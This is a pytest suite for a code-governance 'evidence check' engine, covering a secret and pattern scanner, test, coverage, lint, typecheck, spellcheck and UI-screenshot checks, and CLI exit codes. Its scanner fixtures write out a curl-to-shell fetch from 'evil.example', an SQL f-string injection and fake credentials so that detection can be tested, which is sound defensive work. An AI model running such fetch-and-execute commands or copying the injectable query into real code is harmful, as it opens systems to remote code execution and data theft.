"""Tests for core/governance/evidence_checks.py — evidence check engine.

PR-4 evidence Quality Gate. All projects are tmp_path fixtures; heavy
subprocesses are either trivially fast real commands (python3 -c) or
monkeypatched. Never touches ~/.arkaos or this repo's own suite.
"""

import json
import os
import subprocess
import sys
import time

import pytest

from core.governance import evidence_checks
from core.governance.evidence_checks import (
    ALL_CHECKS,
    UI_SCREENSHOT_WINDOW_HOURS,
    CheckResult,
    EvidenceReport,
    _check_ui_screenshot,
    _derive_overall,
    main,
    run_evidence_checks,
)


# ─── Fixture projects ───────────────────────────────────────────────────


def _write_coverage_xml(project, line_rate: float) -> None:
    (project / "coverage.xml").write_text(
        f'<?xml version="1.0"?>\n<coverage line-rate="{line_rate}" '
        'branch-rate="0.8"></coverage>\n',
        encoding="utf-8",
    )


def _result(report: EvidenceReport, check: str) -> CheckResult:
    return next(r for r in report.results if r.check == check)


# ─── security-grep ──────────────────────────────────────────────────────


def test_security_grep_flags_fake_secret(tmp_path):
    bad = tmp_path / "settings.py"
    bad.write_text(
        'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\npassword = "hunter22"\n',
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["settings.py"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.ran is True
    assert result.passed is False
    assert "settings.py:1" in result.summary
    assert "aws-access-key" in result.summary
    assert report.overall == "fail"


def test_security_grep_passes_clean_file(tmp_path):
    clean = tmp_path / "service.py"
    clean.write_text("def handler():\n    return 1\n", encoding="utf-8")
    report = run_evidence_checks(
        tmp_path, changed_files=["service.py"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.ran is True
    assert result.passed is True
    assert report.overall == "pass"


def test_security_grep_detects_curl_pipe_and_sql_fstring(tmp_path):
    bad = tmp_path / "deploy.sh"
    bad.write_text("curl https://evil.example/install.sh | sh\n", encoding="utf-8")
    sql = tmp_path / "repo.py"
    sql.write_text('cursor.execute(f"SELECT * FROM t WHERE id={x}")\n', encoding="utf-8")
    report = run_evidence_checks(
        tmp_path,
        changed_files=["deploy.sh", "repo.py"],
        checks=["security-grep"],
    )
    summary = _result(report, "security-grep").summary
    assert "curl-pipe-shell" in summary
    assert "sql-fstring-interpolation" in summary


def _git(project, *args):
    import subprocess

    subprocess.run(
        ["git", *args], cwd=project, capture_output=True, check=True,
        env={"PATH": "/usr/bin:/bin:/usr/local/bin",
             "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
             "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t",
             "HOME": str(project)},
    )


def test_security_grep_is_diff_aware_in_a_git_repo(tmp_path):
    """Pre-existing patterns on the base branch are master's debt, not
    this change's (QG blocker, PR1 Interaction Reform): only ADDED
    lines are scanned when git can provide a diff."""
    _git(tmp_path, "init", "-b", "master")
    legacy = tmp_path / "install.sh"
    legacy.write_text(
        "# docs: curl https://example.com/install.sh | bash\n",
        encoding="utf-8",
    )
    _git(tmp_path, "add", "install.sh")
    _git(tmp_path, "commit", "-m", "base")
    _git(tmp_path, "checkout", "-b", "feature")
    legacy.write_text(
        "# docs: curl https://example.com/install.sh | bash\n"
        "echo 'new harmless line'\n",
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["install.sh"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is True, result.summary
    assert "added-lines" in result.command


def test_security_grep_still_flags_newly_added_patterns(tmp_path):
    _git(tmp_path, "init", "-b", "master")
    script = tmp_path / "deploy.sh"
    script.write_text("echo ok\n", encoding="utf-8")
    _git(tmp_path, "add", "deploy.sh")
    _git(tmp_path, "commit", "-m", "base")
    _git(tmp_path, "checkout", "-b", "feature")
    script.write_text(
        "echo ok\ncurl https://evil.example/install.sh | sh\n",
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["deploy.sh"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is False
    assert "curl-pipe-shell" in result.summary


def test_security_grep_falls_back_to_whole_file_outside_git(tmp_path):
    # tmp_path is not a git repo → mode is whole-file (fail closed on
    # scan scope, never silently narrower than before).
    bad = tmp_path / "x.sh"
    bad.write_text("curl https://e.example/i.sh | sh\n", encoding="utf-8")
    report = run_evidence_checks(
        tmp_path, changed_files=["x.sh"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is False
    assert "whole-file" in result.command


def test_security_grep_skips_without_changed_files(tmp_path):
    report = run_evidence_checks(tmp_path, checks=["security-grep"])
    result = _result(report, "security-grep")
    assert result.ran is False
    assert result.passed is None
    assert report.overall == "insufficient-evidence"


# ─── tests check (test_command override, real trivial subprocesses) ─────


def test_tests_check_with_passing_override(tmp_path):
    report = run_evidence_checks(
        tmp_path,
        checks=["tests"],
        test_command=f"{sys.executable} -c pass",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is True
    assert result.exit_code == 0
    assert report.overall == "pass"


def test_tests_check_with_failing_override(tmp_path):
    report = run_evidence_checks(
        tmp_path,
        checks=["tests"],
        test_command=f"{sys.executable} -c 'raise SystemExit(2)'",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is False
    assert result.exit_code == 2
    assert report.overall == "fail"


def test_tests_check_timeout_is_clean(tmp_path, monkeypatch):
    def fake_run(*args, **kwargs):
        raise subprocess.TimeoutExpired(cmd=args[0], timeout=1)

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, checks=["tests"], test_command="pytest -q",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is None
    assert result.summary == "timeout"
    assert report.overall == "insufficient-evidence"


def test_tests_check_skips_when_no_runner(tmp_path, monkeypatch):
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is False
    assert result.passed is None


# ─── coverage check (parse-only, shared helper) ─────────────────────────


def test_coverage_above_threshold_passes(tmp_path):
    _write_coverage_xml(tmp_path, 0.92)
    report = run_evidence_checks(tmp_path, checks=["coverage"])
    result = _result(report, "coverage")
    assert result.ran is True
    assert result.passed is True
    assert "92.0%" in result.summary
    assert result.details_path == str(tmp_path / "coverage.xml")


def test_coverage_below_threshold_fails(tmp_path):
    _write_coverage_xml(tmp_path, 0.55)
    report = run_evidence_checks(tmp_path, checks=["coverage"])
    assert _result(report, "coverage").passed is False
    assert report.overall == "fail"


def test_coverage_junit_fallback(tmp_path):
    (tmp_path / "junit.xml").write_text(
        '<testsuite name="pytest" errors="0" failures="1" tests="10"/>',
        encoding="utf-8",
    )
    result = _result(run_evidence_checks(tmp_path, checks=["coverage"]), "coverage")
    assert result.ran is True
    assert result.passed is False
    assert "1 failures/errors" in result.summary


def test_coverage_skips_without_artifacts(tmp_path):
    result = _result(run_evidence_checks(tmp_path, checks=["coverage"]), "coverage")
    assert result.ran is False
    assert result.passed is None


# ─── lint / typecheck detection ─────────────────────────────────────────


def test_lint_skips_without_tooling(tmp_path, monkeypatch):
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    result = _result(run_evidence_checks(tmp_path, checks=["lint"]), "lint")
    assert result.ran is False
    assert "no lint tooling" in result.summary


def test_lint_runs_ruff_when_available(tmp_path, monkeypatch):
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )
    calls = {}

    def fake_run(cmd, **kwargs):
        calls["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="All checks passed!", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    result = _result(run_evidence_checks(tmp_path, checks=["lint"]), "lint")
    assert result.ran is True
    assert result.passed is True
    assert calls["cmd"][0] == "ruff"


def test_typecheck_skips_without_configuration(tmp_path, monkeypatch):
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    result = _result(
        run_evidence_checks(tmp_path, checks=["typecheck"]), "typecheck",
    )
    assert result.ran is False


def test_typecheck_detects_mypy_config(tmp_path, monkeypatch):
    (tmp_path / "mypy.ini").write_text("[mypy]\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/mypy" if name == "mypy" else None,
    )
    monkeypatch.setattr(
        evidence_checks.subprocess, "run",
        lambda cmd, **kw: subprocess.CompletedProcess(cmd, 1, stdout="error: bad", stderr=""),
    )
    result = _result(
        run_evidence_checks(tmp_path, checks=["typecheck"]), "typecheck",
    )
    assert result.ran is True
    assert result.passed is False
    assert "mypy" in result.command


# ─── spellcheck ─────────────────────────────────────────────────────────


def test_spellcheck_skips_without_codespell(tmp_path, monkeypatch):
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    report = run_evidence_checks(
        tmp_path, changed_files=["README.md"], checks=["spellcheck"],
    )
    result = _result(report, "spellcheck")
    assert result.ran is False
    assert "codespell" in result.summary


def test_spellcheck_skips_without_md_files(tmp_path, monkeypatch):
    monkeypatch.setattr(
        evidence_checks.shutil, "which", lambda _: "/usr/bin/codespell",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["module.py"], checks=["spellcheck"],
    )
    assert _result(report, "spellcheck").ran is False


# ─── overall derivation ─────────────────────────────────────────────────


def _cr(check, ran, passed):
    return CheckResult(
        check=check, ran=ran, passed=passed, command="", exit_code=None,
        summary="",
    )


def test_overall_fail_beats_pass():
    results = [_cr("lint", True, True), _cr("tests", True, False)]
    assert _derive_overall(results) == "fail"


def test_overall_pass_requires_a_concluded_check():
    assert _derive_overall([_cr("lint", True, True)]) == "pass"


def test_overall_insufficient_when_nothing_concluded():
    results = [_cr("lint", False, None), _cr("tests", True, None)]
    assert _derive_overall(results) == "insufficient-evidence"


def test_unknown_check_is_skipped(tmp_path):
    report = run_evidence_checks(tmp_path, checks=["nonsense"])
    result = _result(report, "nonsense")
    assert result.ran is False
    assert "unknown check" in result.summary


def test_default_runs_all_checks(tmp_path, monkeypatch):
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    report = run_evidence_checks(tmp_path)
    assert [r.check for r in report.results] == list(ALL_CHECKS)


# ─── CLI ────────────────────────────────────────────────────────────────


def test_cli_json_output_and_exit_codes(tmp_path, capsys):
    bad = tmp_path / "leak.py"
    bad.write_text('token = "ghp_0123456789abcdefghijkl"\n', encoding="utf-8")
    exit_code = main([
        str(tmp_path),
        "--checks", "security-grep",
        "--changed-files", "leak.py",
        "--json",
    ])
    payload = json.loads(capsys.readouterr().out)
    assert exit_code == 1
    assert payload["overall"] == "fail"
    assert payload["results"][0]["check"] == "security-grep"


def test_cli_insufficient_evidence_exit_code(tmp_path, capsys):
    exit_code = main([str(tmp_path), "--checks", "security-grep"])
    out = capsys.readouterr().out
    assert exit_code == 2
    assert "overall: insufficient-evidence" in out


def test_cli_pass_exit_code(tmp_path, capsys):
    clean = tmp_path / "ok.py"
    clean.write_text("value = 1\n", encoding="utf-8")
    exit_code = main([
        str(tmp_path),
        "--checks", "security-grep",
        "--changed-files", "ok.py",
        "--json",
    ])
    assert exit_code == 0
    assert json.loads(capsys.readouterr().out)["overall"] == "pass"


# ─── ui-screenshot (Excellence Reform PR-D3) ────────────────────────────


def _png(path, size=20 * 1024, mtime=None):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(b"\x89PNG" + b"\x00" * size)
    if mtime is not None:
        os.utime(path, (mtime, mtime))
    return path


def test_ui_screenshot_skips_without_changed_files(tmp_path):
    result = _check_ui_screenshot(tmp_path, None, None, 30)
    assert not result.ran
    assert "no changed files" in result.summary


def test_ui_screenshot_skips_when_no_ui_files_changed(tmp_path):
    result = _check_ui_screenshot(tmp_path, ["core/state.py"], None, 30)
    assert not result.ran
    assert "no UI files changed" in result.summary


def test_ui_screenshot_fails_when_ui_changed_without_artifact(tmp_path):
    result = _check_ui_screenshot(
        tmp_path, ["app/Hero.vue", "core/state.py"], None, 30
    )
    assert result.ran and result.passed is False
    assert ".arka/evidence/ui" in result.summary
    assert "design-review" in result.summary


def test_ui_screenshot_passes_with_recent_artifact(tmp_path):
    newest = _png(tmp_path / ".arka" / "evidence" / "ui" / "d" / "hero.png")
    result = _check_ui_screenshot(tmp_path, ["app/Hero.vue"], None, 30)
    assert result.ran and result.passed is True
    assert result.details_path == str(newest)
    assert "hero.png" in result.summary


def test_ui_screenshot_rejects_stale_artifact(tmp_path):
    stale = time.time() - (UI_SCREENSHOT_WINDOW_HOURS + 2) * 3600
    _png(tmp_path / ".arka" / "evidence" / "ui" / "old.png", mtime=stale)
    result = _check_ui_screenshot(tmp_path, ["app/Hero.vue"], None, 30)
    assert result.ran and result.passed is False


def test_ui_screenshot_rejects_undersized_artifact(tmp_path):
    _png(tmp_path / ".arka" / "evidence" / "ui" / "tiny.png", size=1024)
    result = _check_ui_screenshot(tmp_path, ["app/Hero.vue"], None, 30)
    assert result.ran and result.passed is False


def test_ui_screenshot_picks_newest_artifact(tmp_path):
    older = time.time() - 3600
    _png(tmp_path / ".arka" / "evidence" / "ui" / "a.png", mtime=older)
    newest = _png(tmp_path / ".arka" / "evidence" / "ui" / "b.png")
    result = _check_ui_screenshot(tmp_path, ["style.css"], None, 30)
    assert result.passed is True
    assert result.details_path == str(newest)


def test_ui_screenshot_failure_fails_overall_report(tmp_path):
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "Hero.vue").write_text("<template/>")
    report = run_evidence_checks(
        tmp_path, changed_files=["app/Hero.vue"],
        checks=["ui-screenshot"],
    )
    assert report.overall == "fail"
